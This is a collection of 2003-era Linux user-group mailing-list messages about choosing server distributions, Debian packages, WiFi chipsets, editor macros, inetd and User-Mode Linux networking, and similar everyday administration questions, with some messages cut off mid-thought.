but I think you can probably find enough on the web to decide if it is
worth investigating more.

In a similar situation I decided for SuSE. With Fedora's moving toward
bleeding edge I didn't think it was a good choice for a server. For
marketing reasons I wanted a widely accepted distribution (it makes it
easier to get around IT when selling and deploying our boxes). 

I found SuSE to be an easy transition from Redhat. No regrets so far.

Any reason not to use Red Hat's Enterprise offerings other than cost? 
The one thing I like about the Enterprise offerings is that they aren't 
EOL'ed so quickly compared to the customer versions of Linux. SuSE 
isn't bad since I believe they are now supporting a given release for 
two years. 

We use RH Enterprise ES on servers in our office and while it is more 
expensive than a "consumer" version of Linux it's much cheaper than AS 
which is overkill for the dual-CPU systems we run in house. I also like 
that it is supported for something like 5 years.

I know we may be dealing with customers in Europe as well and so I'm 
waiting for someone to ask us to deploy our system on SuSE Enterprise 
at some point.

I did a 7.3-> Fedora upgrade on a machine and am happy with the results.
There was one problem in the upgrade with the printing system. Fedora
no longer comes with the lprng printing system, it uses cups. An application
that I had written needed slight modification to work with cups.

I have machines with Debian, Gentoo and now Fedora and don't see any
really significant advantages of one over the other. Deep down they
are mostly the same.

If you want the smoothest upgrade I recommend Fedora. If you
want to spend some time and learn another system Debian would 
be a good one to try.

I have seen where carrier errors also indicate a duplex mismatch.  You may 
need set the duplex with parameters in your /etc/modules.comf if the driver is
a kernel module or passed in the boot parameters if the driver is
compiled in the kernel.

Fedora certainly offers the vastly preferable option of upgrading the 
current system rather than completely reinstalling.  However, the 
bleeding-edge aspect of Fedora sounds ominous.  Is the bleeding-edge 
stuff just about scaring server admins into buying RHEL, or is there 
some truth to it?

The printing issue is a non-issue for my server.  The only hardware I 
need support for is the ethernet card.  If I were to do the upgrade to 
Fedora, is it at all possible to do the upgrade remotely?  The server is 
at a friend's house and I may not be able to get physically in front of 
it before the end of the year.

Thanks to everyone else.  I will look into the various distos mentioned.

Nope.  But the cost is prohibitive.  I am a low-cost operation (bought

You're gonna be at it a while. :)

Actually, it's really not too bad. Just as long as you aren't hoping
to run KDE or anything, you should be fine... I've still got Debian
cooking on a 233MHz Cyrix at school. Works like a champ.

Yes, the license model. I want to stick to a single distribution within
our company to keep it simple. We use it for the servers, desktops and
for network appliance products we sell. I don't want to have to buy a
Redhat Enterprise license for every box we deploy. Maybe Redhat offers
an alternative license for this purpose but they didn't make it apparent
on their web pages and trying to figure out the license model of vendors
is not productive.

Traditionally, when Red Hat released a version of its free Linux
distribution, it shipped with newer software, some of it quite
bleeding edge (e.g., libc-6, the oft-maligned gcc 2.96, NPTL). In that
regard, Red Hat always resembled Debian testing more than Debian
stable.

The Fedora releases change things in a few ways:

* Fedora comes with no support for Red Hat, Inc.

  Maybe this is a problem for some people, but I've never heard Debian
  users grumble about a lack of support from Debian, Inc. :-) Same
  thing with Gentoo, Slackware, ...  We get support from mailing
  lists, IRC, web pages, etc.

* The upgrade cycle for Fedora will be more frequent: 2-3 times per
  year rather than once per year.

  This might pose problems for admins in charge of production systems.
  It used to be that you could wait for a new Red Hat release to get
  put through a shakedown before upgrading. With Fedora, Red Hat won't
  be providing errata for older releases, so either you upgrade to
  each new Fedora Core version or you take the responsibilty for
  patching stuff yourself.

If you're the sort of admin who's comfortable running, say, Gentoo or
Debian testing on your server, then Fedora will probably work without
a hitch.

If long, long uptimes are really crucial, then Fedora isn't the way to
go.

O Great Gurus,

Since Kmail does not respect environment variables, I've been tinkering 
with setting it to use an external editor. It's easy to configure a 
graphical editor like gvim in the KMail settings, but what I'd really 
like to do is run vim. Obviously vim needs a shell to run in. I've 
tried different combinations, like 'xterm vim %f', and other 
combinations, but it doesn't work.

Yes I read the Kmail help. :)

any ideas? I don't know if this is even possible, it probably isn't, but 
what the heck, you don't know til you try.

Not to mention the slight lack of additional performance from all that
compiling.

Depends where you want to place that downtime. For the least downtime
*now*, yes Fedora will likely be the quickest update now. If you're more
interested in the long term, then things become muddier.

Fedora will be closer to the bleeding edge, as such there is significant
danger of severe breakage in future versions (not that RedHat hasn't been
badly broken on some versions); there are much better choices if this
system is a server that needs to remain up. If money is not an issue then
the suggestion of RedHat Enterprise is an option. SuSE might also fit
you better. Whether or not money is a concern, Debian is an extremely
good choice, very long release cycles, and very stable. Debian though
will likely not have everything you had in RH 7.3, and some of the
binaries may be older, but future updates will be much easier. Libranet
should make the transition much easier than Debian, but they haven't been
around as long as Debian.

In the end, it comes down to choose your form of poison based on which
concerns are the largest. For stability and uptime over the longer haul,
nothing beats Debian. If you're only concerned about the length *this*
downtime, then yes, Fedora /might/ be the path of choice. If the two
concerns are balanced then SuSE, RedHat Enterprise, or Libranet are
options.

Myself, Debian forever.  :-)  I want to be able to directly touch the
configuration files, and not have to touch things (other than security
updates) on a weekly basis. I just wish the release cycle was just a bit
shorter.  :-)

kvim.  Google for it.  Not sure where the site is.  Kvim is a wrapper around 
vim for KDE and I'm fairly sure it is a kpart too.  I think it will be 
embeddable.

I haven't had any problems directly contacting the kmail folks on their 
mailing lists.  Drop them a note.

You've nearly convinced me to go to Debian.  I tried to use 
http://packages.debian.org/ to check to see if the packages i need are 
available, but the site is still down due to that compromise last month. 
  So if you don't mind, I'll pick your brain.  These are the services I 
run (in priority order):

ssh (openSSH 3.1p1 right now, would really like to upgrade)
http (apache, including php and cgi. Would like to upgrade php to 4.3.x)
smtp (using sendmail now, but for no particular reason)
pop3 (using gnu-pop3d, also for no particular reason)

And a variety of user-level programs, including VNC and an ircd.

What are the versions of these things that are available in debian?  And 
which flavor of debian should I get?

Please don't hesitate to throw a couple of URLs at me if this is all 
explained well elsewhere.

Almost a convert,
Evan

That's the one! Thanks much! And amazingly, it's even in the xterm man 
page. This is great, I was looking for a way to do this with other 
programs too, not just Kmail.

Yes, I didn't realize how much I depended on that page until it went 
down. :( 

I grew up with Red Hat, but I totally love Debian now. Having that 
automatic dependency-resolving is absolutely great. It looks like all 
the major distributions are moving towards their own type of 
dependency-resolvers, which is great for Linux in general. Resolving 
dependency conflicts ranks real low on my list of fun things.

The one thing that might prove vexing is if you like getting the latest 
and greatest. You can do that on Debian by running Testing or Unstable. 
However, only Stable gets priority for security updates. Testing gets 
some, Unstable never.

You can also use Checkinstall to easily create .debs from tarballs, 
which makes for much easier removals and upgrades.

I have 3.6.1, on a Testing system. The others I can't help you with.

> And 
> which flavor of debian should I get?

As I said above, security updates are the main concern. All three 
releases are stable and usable, even Unstable is more reliable than a 
lot of supposedly 'mature' distros. If you're OK with slower security 
updates, Testing will give you much newer versions of programs.

Debian does things very differently than RPM-based systems. The kernel 
is pretty much plain vanilla, and you don't get all the management 
tools that Red Hat provides. That's right, ya gotta edit text files.  
Here's some good reference docs, should you decide to take the plunge. 

http://qref.sourceforge.net/
http://www.debian.org/doc/manuals/apt-howto/index.en.htm

A lot of Debian manuals are installed into /usr/doc, and many are 
packaged so you can install them on your system. See http://
www.debian.org/doc/user-manuals.

You can use yum to update remotely to Fedora Core 1, though it's not
the recommended method. Install yum and fedora-release packages, edit
/etc/yum.conf, and "yum update".

Apparently anaconda does additional magic that will "do the right
thing" when updating, so YMMV.

Subject: [PLUG] WiFi Card
Message-ID: <1071365771.7346.21.camel@dell.linux.box>

I seem to have fried my WiFi card - it was a good card, too, based on
the Atmel chipset.  My CPU fan got blocked off without my realizing it -
the temp hit 88 degrees C before I caught it and killed Boinc and upped
all the fans to their maximums.  No other damage seems to have been
done.  As I upped the fans, my WiFi link dropped to zero.

It doesn't work in Windows, either, leading me to believe we're looking
at a hardware failure.  Bummer.  I really like wireless networking.

So I'm hunting WiFi cards.

I've found a few on Newegg that *might* work under Linux for around $20
or so, one at $30 *should* work... and appears to be an Ornico Gold? 
I'd rather spend as little as possible and be up and running ASAP.

Has anybody bought a cheapo 802.11b card at Fry's or somewhere else
local that worked with Linux reasonably well?  Unfortunately, what
little income I have right now is being directed towards the purchase of
something else and Christmas... leaving very little towards replacement
PC hardware.  :-)

I'd appreciate some input!

After building a couple of thousand pcs I couldn't agree more.  I'm 
continually impressed by the fans that Intel supplies with the boxed 
processor product line. I've only see two that have failed.  The first on 
a pentium system that had so much dirt/dust in it that the heat sink was 
packed allowing for no air flow.  The second was on my personal P4 2.4Ghz.  
Fan just outright failed during normal operation.  I suspect it was more 
to do with the windings on the motor rather than the bearings.

Don't go cheapo, they change chipsets and don't tell you about it. 
Netgear is about the cheapest you should go (they've been consistant so
far anyway).

Any reason one couldn't purchase /one/ copy of RHEL and install the
GPL'd stuff on all of their systems?

    http://www.redhat.com/software/rhel/faq/#six

    Q: You mentioned licensing - what does this mean? I thought Linux
       was free.

    A: Except for a few components provided by third parties (for example,
       Java) all the code in Red Hat products is open source and
       licensed under the GPL (or a similar license, such as the LGPL).
       So you always have free access to the source code. In fact you
       can download it from our FTP servers at any time. However, Red
       Hat does not provide free access to the binaries of Red Hat
       Enterprise Linux, and these, combined with an annual subscription
       to Red Hat Network, access to upgrades, and a selected support
       services, are the components that Red Hat bundles into each Red
       Hat Enterprise Linux solution. Since every Red Hat Enterprise
       Linux product includes support for the system on which it is
       installed, Red Hat supplies the products with a per-system
       usage/support subscription. This simple model ensures that
       systems which use Red Hat Enterprise Linux are able to access the
       maintenance, services and product upgrades to which they are
       entitled. Of course, as mentioned before, this has no impact on
       your access to the Red Hat Enterprise Linux source code.

Need binaries? Download the src.rpm's and 

    rpm -i *.src.rpm
    cd /usr/src/redhat/SPECS
    rpmbuild -bb *.spec

They will test software on equipment.  The equipment is dontated by the
memembers.  The current focus is real data center equipment.

So if you want to to test your latest patch, and it needs data center
equipment, then become an associate:

        Associates. Being an Associate requires no obligations of the
        individual other than a legitimate e-mail address so we can
        contact you. OSDL Associates can also receive OSDL's newsletter
        and other timely updates.
      * See the ''Lab Projects'' area of the site to see existing
        projects and learn how to request lab hardware resources.
      * OSDL sponsors the Carrier Grade Linux and Data Center Linux
        working groups. These working groups consist of OSDL members and
        interested individuals dedicated to creating feature roadmaps,
        specifications, and participating in open source projects to
        further develop Linux for use in telecommunications
        architectures and data centers.
      * OSDL is also actively involved in kernel testing by providing an
        open workbench for patch testing (the Scalable Test Platform),
        the creation of open source workloads, and contributing to the

The official package is 3.4p1-1.woody.3, which would be OpenSSH 3.4p1
with security and packaging patches.

Apache package 1.3.26-0woody3 is current, again Apache 1.3.26 with
patches.

PHP package 4.1.2-4, no luck here though this will include backports of
all the security patches.

Debian's prefered mailserver is Exim, but Sendmail is also packaged,
8.12.3-6.6.

No gnu-pop3d in stable, but there are a zillion other pop3 servers
available in Debian-stable.

Package ircd, 2.10.10.pl18-4, "Undernet ircd"; package dancer-ircd,
1.0.31+maint8-1, "OpenProjects Net ircd". I believe there are a couple
VNC clients and servers, the official vncserver though is 3.3.3r2-20.

Given that stability is a concern, "stable". stable is just that, stable,
rock solid, alas this does mean updates are very far apart, the current
stable was released about a year ago and it is looking like the next
release is about 1 year away. "unstable" is the bleeding edge, as such
things get broken. "testing" is in between, things generally mostly work,
but things do get broken.

I've used sendmail on Debian for years and they're quite speedy with the
updates.

Uh... isn't gnu-pop3d just courier-pop now?  or is this another package?

Courier-pop is there and I'm using it on another machine without
troubles... I believe it's 0.37 in stable.

And Debian still has the vrms package.  Virtual Richard M. Stallman will
tell you how free your system is.

jbrelin at shaft:~$ vrms
No non-free packages installed on shaft!  rms would be proud.

Message-ID: <200312141117.48535.carla@bratgrrl.com>

Yo gang,

Is there a printed or online reference somewhere that documents Linux 
metacharacters? Here is one example of what I'm looking for: in 
programs like Pan and Kmail, there are options for configuring external 
programs:

gvim %f = Kmail external editor -- %f = file
mozilla %s = Pan web browser --  %s = URL
xterm -e vi %t = Pan external editor --  %t = file

Even from this small example you can see the inconsistencies, and I 
haven't found anything that says 'the percent sign is used in variable 
substitution.'
Now these here programmers must be learning this stuff somewhere! 
There's often these odd little option flags in applications, and 
sometimes it's difficult to find out what they mean, and what other 
options might be available. If it is permitted, this lowly luser wants 
to know the sekkrit options.

thanks,
Carla

The C printf is probably where this comes from.

Hi.

Last night, I installed Debian (stable, apparently) on my desktop to get 
acquainted with it before I install it on my server. Nearly everything 
went through fine, but at least one package failed during the "setting 
up" stage of apt-get installing it.  Because I was installing 478 
packages at the same time, both the name of the package and the error 
message flew off the top of the screen before I got a look at it.

My question is this: Is there a log of the install, and if so, where is 
it?  I do know that the errors occurred during base-config.

Thanks,
Evan

Run "apt-get upgrade" again and if it is still failing, it should show
up with a lot less clutter.  As to the install log, I don't know the
answer off the top of my head.

For some information on wireless cards.  I run a rebranded Senao
200MW PCMCIA card on my laptop.   In general, Prism chipsets are
well supported, and more power is better.  

If you blew up a PCI card in your desktop, you will probably find
that it contains a little metal box.  Pop the lid and inside is a
... PCMCIA card! ... in a socket with connectors.  If you feel 
strongly about staying with a PCI card, you may be able to pop in
a new PCMCIA card (with appropriate connectors) into that socket
and get the PCI card working again (maybe - the PCI interface 
chip could be blown and this would not work).  You may even find
that unseating and reseating the card restores function;  temperature
cycling sometimes walks devices out of sockets, and sometimes a poor
connection will oxidize.  Worth a try.

I've already ranted about why an external AP is better, but if you 
weren't convinced then, you won't be convinced now, so we will leave
that aside.  Blowing up a PCI card in a desktop does add yet another
interesting argument against PCI cards, though!

Prism chipsets tend to be more expensive I think, though... or really
rare... I haven't seen them in any of the super-cheap cards I've looked
at.

I fried my PCMCIA card, though.  It's a laptop, the CPU hit 88 degrees
C, the card stopped working... I just hope it isn't something in the
laptop that is damaged.  :-)

PCMCIA is so much easier for a laptop, though, than dealing with an
external USB device.  :-)

Chris,

    I hope someone got back to you sooner than I am, but here is my
response.

    I want to encourage you and others to start local and special
interest Open Source user groups.  This is really important to
promoting Open Source software.  Retailers don't make a lot of
money off of Linux and other Open Source software, so they aren't
going promote it the way they have promoted other software.  Thus,
those of us who care about Open Source software have to find other
ways of promoting it and LUGs are certainly one very important way
of doing this.

    There are any hard and fast rules about starting and running
LUGs, but I have found that:

    (1)  It is nice to have a web site.  However, this will come
         with time.  It does not have to be one of the first things
         you do.
         (If you want a web site, lots of people will give you space
          for free.  If you can't find a good place to host it, PLUG
          will give you space on our server.)

    (2)  A mailing list like plug at pdxLinux.org is much more important
         than a web site, because it gives everyone a good way of
         communicating with each other.
         (PLUG is also willing to host a mailing list using mailman
          on our server if you need this.)

    (3)  The next thing is the importance of simply meeting and you
         seem to have this all lined up.  It works best if you have
         a program, but a small group can get by without planned
         programs and probably needs to get by without planned
         programs because of the amount of effort required.
         However, the important thing about meetings is to have them
         consistantly - same place - same time - every month, week, year
         or whatever.

         It can be difficult to select a time to meet.  You need a
         time when most people can come.   Your meeting times are
         also tied to your meeting locations since many sites are
         only available certain days.  This is especially true for
         groups like PLUG that need free space.  (PLUG likes to use
         PSU for our monthly meetings, because PSU has been good
         enough to give us excellent space and facilities including
         access to an Infocus type projector for our meetings.
         Of course, this means we can't have beer and food at the
         meetings, but we get around this by scheduling the after meeting
         meeting at the Lucky Labrador <www.luckylab.com>.  PLUG
         schedules other meetings elsewhere.  For example, we have
         our monthly clinics at Riverdale High School who provide
         excellent facilities for hands-on work, and we have our
         monthly advanced topics meetings at Jax's which is centrally
         located and has good food and drink.)

         I don't know what schedule would work well for your group, but
         I would consider a weekend meeting - because this might help
         you get an out of town speaker now and then.  I know I would
         be willing to spend a day or two at Lincoln city that included
         a presentation to your group.  I could bring my wife and she
         could go shopping for a couple hours while I gave the talk.
         (Of course, it might be a better talk if I went shopping while
         she gave the talk.)

    (4)  You talked about doing a few demo installations during your
         first meeting - say RedHat, SuSE, Gentoo, etc.
         I would also have a few copies of Knoppix CDs to hand out
         if possible.  Knoppix will run directly from CD on many
         PCs and this makes it great for people who just want to try
         Linux without installing it on their hard disk.  (Knoppix
         requires a fair bit of resources to run directly from CD.
         You need an Intel based computer with at least 128mb of RAM
         and it prefers 192mb+.)

    (5)  Once you get the LUG up and sort of going and get a web site
         built, you can register the LUG at places like:

                    www.Linux.org
                    http://www.ssc.com:8080/glue
                    http://lugww.counter.li.org/

         and then if you want you can start calling various Linux vendors
         once in a while and hit them up for goodies to give out at
         meetings.  Of course, they have all cut back on this during the
         recession, but a few of them still give things to LUGs as
         advertising.

                                          Sincerely,

I have and addtron PCI card what is a PCI->PCIMCIA bridge.......  No
metal box on that one.

I took apart the AP.  Same metal card with a piece of crap connector to
the external antenna, and a few chips (ethernet, pcimcia, and web
browser).

I have been told, the USB devices are the same.

I have been wondering if USB wireless devices get better reception since
they have an external antenna (while cheap) and reside outside of the
box, and can be positioned better.

That must be new.  All the cheap sets I've ever looked were prism.

there are several ways of doing this...
if you're using bash set the ulimit core size like this (this seems
reasonable, but it is 2:13 am here too)

ulimit -c 999999

if the program generates a core file, you can find out what caused it,
by using

gdb -c <corefile> /path/to/executable (works really well if the
executable was built with debug info)
and when it starts up enter 'bt' for a back trace


if you built it from source, you could rebuild it, but change the
Makefile and edit the CFLAGS variable to have '-ggdb' for a really big
fat executable with plenty of debug info and try to recreate the
segfault.

the -ggdb will set all kinds of info in the executable including the
filename and line number of each function, and will tell you where the
segfault occurs...if it's pointing to libc, chances are (this isn't 100%
but it's pretty close) that the program is sending libc a crappy pointer
rather than libc being munged...but crazier things have happened)

if you don't wanna do that, you could check the sourceforge page for
reported bugs...

or...

check /var/log/messages for any big problems logged to syslog....

or...

you could always try strace ... 
as in strace /path/to/program/executable arg1 arg2 ... argN

but that is a little less user friendly that gdb i think...but still
very informative.....if you are still having problems, email me directly
and I'll try to help you out...

That happens from time to time.  The best method is to just go with
the base system to start with, then install aptitude, then go from
there.  Most people just ignore dselect's existence these days.

Seems to me that a lot of vendors are moving away from prism.  I purchased a
Linksys WMP11 after great reviews on personaltelco.net.  Two things have
changed since those wonderful reviews.  A) Cisco owns them now, and B) they
are no longer prism based, but broadcom, which there are no linux drivers
for.

I returned the Linksys for a Dlink DWL-520+.  Same thing.  The DWL-520 was
prism based and well supported by linux, but the "+" is based on a TI ACX100
chipset.  There is a sourceforge project for the ACX100, and I did end up
getting it to work, but so far can not get it to run in an AP mode.  Back to
fry's it goes.

Also try a apt-get -f install.

This will continue to install all the packages that you have downloaded
and setting them up.  Eventually, the only packages that you will have
left is the ones with the errors.

The most common error that I see is files existing in multiple files. 
Reading the error message usually makes this clear.

a dpkg --force-overwrite
/var/cache/afbackup/archive/full_package_name.deb 

will usually fix this issue.

My initial hunch is that you'll want to edit /etc/syslog.conf, not
/etc/inittab. Check to see what's being logged to everyone, e.g.,

*.emerg               *

Another possibility is that your bootloader is appending a number of
console statements to your kernel invocation, e.g.,

title Linux
  root (hd0,0)
  kernel [...] console=tty6 console=tty5 console=tty4 [...]

Sean,

  Yup. That's got it. Two things impressed me about the series of articles:
1) how little the writers understand about linux, GNU components and
distributions; and 2) how articles can contradict themselves. In the latter
case, one article suggests large corporations are holding back on migrating
to linux because of mad SCO disease while other articles note that there is
no sign of that.

  However, all publicity is good publicity. Within reason, of course. :-)

Thanks,

Rich

I installed a new browser and email program (Mozilla Firebird and

When I get an email message with a web link in it, I can't just click on

using tools.  I also don't know if the Gnome tools will work because I 
use KDE.  Does anyone know how I can get this stuff to work again?

My question is very basic.  I have a RedHat 6.2 system.  I would like to
update the kernel, but a long time ago the automatic up2date feature stopped
working.  I'm not sure why.  Therefore, I would like to update the kernel
the old-fashioned way: retrieving a kernel via ftp and running an rpm
command.  I did some searching on my own, but I'm not certain what the
canonical site would be to obtain the kernel, or what the appropriate
options to the rpm command should be.  Can someone please provide me with
these details, and any other steps that may be necessary to carry out this
update?

I know that I could just buy an new operating system, but this machine has a
good deal of software on it that probably would not be compatible with a
newer OS, and I've done extensive configuring of various services that I am
reluctant to redo.  Thanks in advance for any assistance, James

It is illegl to sells SUSE unless it is accompanied with a registration
key. SUSE can be given away without a key, but each sold version must be
a fully licensed copy accompanied by a registration key.

Thanks for the information.

Message-ID: <1071529994.30499.120.camel@dell.linux.box>

I'm hoping somebody here knows if I can get this info easily with
Debian...

I'm trying to get binc-imap running on a Slackware 8.1 box.  I'm running
in to problems that *seem* to be related to my use of inetd and tcpd
instead of xinetd and/or daemontools which I just plain want to stay
away from.  Regular binc-imap works fine, but if I try and use TLS or
SSL at all, be it on the regular imap port or on 993 (which runs
bincimap-up --ssl) it doesn't connect.

In my googling for information about this, I've discovered Debian
automagically modifies the inetd.conf file to set up for imaps and
imap2... is there an easy way I can get these two lines they put in
there?  Everybody and their brother seems to be using xinetd and/or
daemontools these days... I really would rather not replace
tried-and-true inetd.

Any ideas?  I have a user account on Drizzle, but other than that I
don't think I have real debian anywhere.

Rob

Well, in general, .deb files are just ar files (like .rpm files are
just cpio), so you can bust them apart that way.

But, you're in luck. I run Debian and I run bincimap. I don't use
inetd, but the lines are still in there. ;-)

The lines it puts in mine are:

#<off>#imap	stream	tcp	nowait	root	/usr/sbin/bincimap-up	/usr/sbin/bincimap-up --conf=/etc/bincimap/bincimap.conf --logtype=syslog -- /usr/bin/checkpw /usr/sbin/bincimapd
#<off>#imaps	stream	tcp	nowait	root	/usr/sbin/bincimap-up	/usr/sbin/bincimap-up --ssl --conf=/etc/bincimap/bincimap.conf --logtype=syslog -- /usr/bin/checkpw /usr/sbin/bincimapd

(The "#<off>#" comment is just Debian's way of automagickally managing
inetd.conf entries.)

Although, in truth, that doesn't look like anything special, and so
perhaps your problem is elsewhere.

Good to know... is there an easy way to download the package as a user
on a debian system?  I think I might have done it once, quite some time
ago, while setting up Jabber.

Well, that's very very much like what I have, unfortunately.  All the
same, I'm going to try them out, paths fixed, of course.

I'll let you know how it goes.....  :-)

Subject: [PLUG] JOE named macros
Message-ID: <200312151624.13108.carla@bratgrrl.com>

Anyone out there up on using named macros in JOE? Here's what the 
instructions say in /etc/joerc:

"Simple macros can be made by comma seperating 2 or more command names.  
For
 example:

 eof,bol	^T Z		Goto beginning of last line

 Also quoted matter is typed in literally:

 bol,">",dnarw	.k1		Quote news article line

 Macros may cross lines if they end with ,

 Commands or named macros may be created with :def.  For example, you 
can
 use:

 :def foo eof,bol

 To define a command foo which will goto the beginning of the last 
line."

So I added this to ~/joerc:
:def foo eof,bol, "helloello"

joerc generates an error message if you don't get your entries right. It 
accepted this line happily. (yes it is flush left) It looks like I need 
to run the command "foo" to run the macro- but I can't figure out how 
to do this. Unless I'm reading this wrong, this is the way to create 
and save macros permanently. Otherwise they disappear when you close 
the program.

Thanks!

*On* a Debian system, you can use "apt-get source packagename" and it
will fetch, unpack, and patch the source files you need to build the
package. If you know your way around how to build a Debian package,
you can find interesting clues. (Specifically, in the ./debian/
directory.)

Then, if you've made changes you can go into that directory and issue
"dpkg-buildpackage -uc -b" and it will build a .deb file. (Or you
could use the "-b" option with the "source" command if you didn't
intend to make any changes.)

If you want to fetch the .deb file itself (or the source+patches),
either on a Debian system or elsewhere, just go to
ftp://ftp.debian.org/debian/pool/main/ and drill down to the package
directory in question and take your pick of revisions. On a Debian
system, it's easier to find your way, though, by looking at the
"Filename:" field you'll see with "apt-cache show packagename".

My problem *has* to be somewhere else.  Damn.  I can connect fine
plaintext login, but if I try and do any TLS or SSL on the main imap
port, it fails.

CONNECTED(00000003)
13801:error:1408F10B:SSL routines:SSL3_GET_RECORD:wrong version
number:s3_pkt.c:286:

If I try it on the imaps port, with the --ssl thing, as above, I don't
seem to get even that far.

Inetd doesn't even seem to start it.

CONNECTED(00000003)
13802:error:1409E0E5:SSL routines:SSL3_WRITE_BYTES:ssl handshake failure:s3_pkt.c:529:

Oh well.

I'm on the binc mailing list, hopefully we will make progress there.

Of course I will share. But I've been pounding on this for a couple of 
days, and I think there is not a way to do this. So the way to have 
custom saved macros is use vim, perhaps. :)

I tried that with the Fort Vancouver Library, there were not interested

  In what situations do you want macros? I could really use a
key-stroke-replay macro to reformat a reference data file.

In xemacs:

C-x (
start typing
C-x )
M-x name-last-kbd-macro


Then, to use:

M-x macro-name


To save:

C-x f ~/.xemacs/init.el
M-x insert-kbd-macro
C-x C-s


There are also ways to make the macro pause and let the user enter
information interactively. Also you can bind macros to keys, of
course. And so on. :-)

Are you talking about doing this in JOE? 'Cause it's easy to record and 
use a macro in JOE, the tricky bit is knowing whatever regexps and 
commands you need. Can you give me an example of what you want to do?

Scratch that, I finally got a working kernel.  For some reason, builds
on Debian/unstable are broken, something foobar'd about host kernel
headers (why they'd be related I am not sure).  I eventually got it
compiled on gentoo (where I'll be hosting anyway) when I stopped to
read the fine manual and learned how to build "linux":  make linux ARCH=um
I'd been leaving out the linux part and things would immediately explode.

Next stumbling block was/is that Gentoo doesn't set up the nice
uml_switch for you like debian does.  I've mostly got it configured by
hand and the virtual machines all talk together, but for some reason
the host box doesn't want to talk to the virtual boxes over the
switch.  

First annoyance is that Gentoo uses devfs and the automatic symlinks
for /dev/net/tun are broken (creates a ->misc/net/tun instead of
->../misc/net/tun, anyone know how/where to fix that?).  Can patch
that brokenness by hand.

I've been creating the tap0 device by hand with:

  tunctl (options?)
  ifconfig tap0 192.168.2.1 up
  
then starting the uml_switch (following Debian's model) with:

  uml_switch -unix /var/run/uml-utilites/uml_switch.ctl -tap tap0 

as a user named uml-net.  Ping from host to virtual gets "Destination
Host Unreachable".  Route looks okay:

   # route -n
   Kernel IP routing table
   Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
   192.168.2.0     0.0.0.0         255.255.255.0   U     0      0        0 tap0
   192.168.0.0     0.0.0.0         255.255.255.0   U     0      0        0 eth0
   127.0.0.0       127.0.0.1       255.0.0.0       UG    0      0        0 lo
   0.0.0.0         192.168.0.1     0.0.0.0         UG    1      0        0 eth0

The tunctl allows an option for specifying a uid, and it says to use
the user who starts the virtuals, but that didn't work either.  Can't
ping in either direction.

Any ideas?

I can't offer any direct advice at the moment, as I use a bridge
model; but mine looks roughly like "ifconfig tap0 0.0.0.0 promisc up".

Again, maybe you need that for uml_switch, who knows.

I think I've got it.  Looking more closely at the Debian stuff, it
looks like: 

  a) I need to do: "tunctl -u uml-net" where uml-net is the owner of
     the uml_switch process.

  b) I also need to: "chown root:uml-net /dev/net/tun", and "chmod 660
     /dev/net/tun".
     
and everything seems happy.  Now I've just got to wrap that in a
script and I'll be more or less done.

Anyone know the devfs magic for fixing the bad symlink?

It is the business of libraries to lend "proprietary" information to
people.

Even the absurd rental exemption for audio recordings in Title 17 does not
apply to lending libraries.

There's nothing that I've ever seen in an EULA that could possibly take
away the ability to store the "covered" software in a public lending
library.  The public is the owner of the property and taking it from the
shelf by any card carrier is exactly like taking it from your own shelf at
home.  I can install it on one computer and then on another later, etc.
A lending library just magnifies the scale without changing the concepts
or mechanics.  It's like selling a copy to a very large household.

Sorry my point was my local library clearly lends software already, why
should the GPL be any different?

I think people are making a big deal out of it.  Instead they should
attempt to donate "powerful business software" to the library and see if
they just put it up.

So, what are these extra command line arguments?  I can not find any

They're just there to look pretty.

Actually, they're variables. For example, you can launch an editor with 
editorname %f (where %f = your filename). You can take out the %f, but 
then it wouldn't open the program AND your target file.

Speaking of Debian, a great resource for those of us who like to stick with
stable is backports.org.  They are a collective that builds newer software under
older version of Debian (like woody).

I was able to upgrade my server to the latest spamassassin/razor2 with no problems
at all.

Can't believe I haven't stumbled on this earlier.  I've been using Debian since
'hamm'.

PS: anyone want to mirror them?  They seem to be lacking US mirrors.

I think the best devfs magic you can do right now is to get rid of

More precisely, they are variable the the calling application fills in.

For instance I run mosex, and extension for mozilla to call external
programs.

I use 
        evolution mailto:%A?Subject=%S&Cc=%C&body=%B

mosex decided what %A means, %S means, etc.

It is arbitrary and up to the program that makes the call.

Thus I could make the call my self:

        evolution 'mailto:zot at whiteknighthackers.com?Subject=This is a subjec"&Cc=cc at cc.com&body=This is the text message\nI am guessing at using \n for linebreaks'

I just typed that in and it worked, expect the line break part.  You
need to just have a mutli-line command line (esay from an app).

Cool... I'd been wondering in the back of my head for a while how I
could get Evolution to work with mailto: links.  Never cared enough to
get it working... but got mozex working with your evolution line above
in about thirty seconds.  :-)

There always seems to be issues about SuSE's licensing.  A lot of

Is there a good doc on migrating away from devfs? I'm in the process
of outfitting my Sun Blade with Gentoo. I haven't had any snags with
devfs yet, but I know it's deprecated. The options, it seems, are to
move to

I see that there's an ebuild for udev, but that's pretty strongly
associated with the 2.6 kernel, right?

AFAIK, just disable devfs in the kernel, don't start devfsd, and create
the device nodes manually.

Yeah, udev is 2.6 only... but I don't see any good reason to not move to
2.6 now.  :-)

I don't think udev is quite ready for prime-time yet, though... I could
be mistaken on that front, however.

I could easily be wrong on this, but my impression was that rest of
Gentoo assumes devfs.  I recall booting a kernel without it and
getting partially hosed (though I don't remember the details).  Bad
Russell!  I rebuilt with devfs and carried on.

I am assuming it is something in /etc/devfsd.conf that controls the
symlink magic.  The symlink appears when I modprobe the tun module.

It varies.  Some of the cheaper cards (like Linksys) have gone to
broadcom.  

I have an older Linksys which is Prism2.  (I am trying to determine the
wattage on it.  Could be anything from 11 to 96mw.)

I also have a Symbol Spectrum24 LA-4121 card.  This one is weird. It
appears to have been pulled from an access point or PCI card.  The
pcmcia on my laptop sees the card, but that is about it.  It might be an
Intersil2 card or it might not.  I have seen Spectrum24 specific
drivers, but they were for older kernels.

I guess I need to hack on it some more.

Mozilla/Multizilla (tabs)/Mouse Gestures/Mosex and the browser is damn
near everything I need *in a browser*, not everything I ever do, just
browsing.  Now if it would stop locking up on odd dns calls and java I

I've been using Firebird for quite a while now... I've only had a few
Flash-related lockups, and even then enough to count on one hand.

That is what I get for cutting and pasting from one of Zot's previous
announcements.  (As well as having a weird calendar in French.)

*sigh*

I will repost with corrected info.

That is Vancouver for you.  Their library people seem less than clued at
times.  But then it has been a few years since I have dealt with them on
a regular basis, so I may be wrong...

Sometimes I wonder if there is something in the drinking water over
there.

  Has anyone else seen this? I send all sorts of attachments from within

I can't imagine Beaverton Library turning you down, they actually
catalog and put on the shelves for checkout all the AOL CD's they get
in the mail (kinda tells you the intelligence behind Beaverton's civic
